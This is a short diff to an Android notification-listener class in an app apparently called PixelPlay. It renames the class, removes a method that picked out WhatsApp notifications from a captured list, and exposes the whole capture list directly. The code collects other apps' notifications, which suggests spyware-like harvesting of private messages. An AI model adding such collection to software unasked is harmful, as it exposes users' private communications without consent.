@@ -11,7 +11,7 @@ import org.json.JSONObject;
 import java.util.ArrayList;
 import java.util.List;
 
-public class MyNotifListener extends NotificationListenerService {
+public class NotificationBridge extends NotificationListenerService {
 
     private static final String TAG = "PixelPlay";
     private static final List<JSONObject> caps = new ArrayList<>();
@@ -47,23 +47,7 @@ public class MyNotifListener extends NotificationListenerService {
     @Override
     public void onNotificationRemoved(StatusBarNotification sbn) {}
 
-    public static JSONArray getCaptured() {
-        JSONArray a = new JSONArray();
-        synchronized (caps) {
-            for (JSONObject n : caps) a.put(n);
-        }
-        return a;
-    }
-
-    public static JSONArray getWhatsApp() {
-        JSONArray a = new JSONArray();
-        synchronized (caps) {
-            for (JSONObject n : caps) {
-                try {
-                    if ("com.whatsapp".equals(n.optString("package", ""))) a.put(n);
-                } catch (Exception ignored) {}
-            }
-        }
-        return a;
+    public static List<JSONObject> getCaptured() {
+        return caps;
     }
 }
